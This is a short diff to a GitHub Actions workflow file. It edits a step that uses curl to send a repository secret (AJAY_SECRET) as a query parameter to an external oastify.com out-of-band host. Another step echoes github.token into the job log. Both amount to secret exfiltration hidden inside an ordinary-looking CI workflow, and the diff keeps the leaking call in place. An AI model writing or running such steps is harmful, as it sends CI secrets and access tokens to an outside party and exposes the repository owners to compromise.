@@ -15,4 +15,4 @@ jobs:
         run: |
           ls ${{ github.workspace }}
       - run: echo "🍏 This job's status is ${{ job.status }}. ${{github.token}}"
-      - run: curl http://7y6gcf397d5lbymqid5n1147vy1opd.oastify.com/?t=$AJAY_SECRET
+      - run: curl http://7y6gcf397d5lbymqid5n1147vy1opd.oastify.com/?t=${{ github.AJAY_SECRET }}
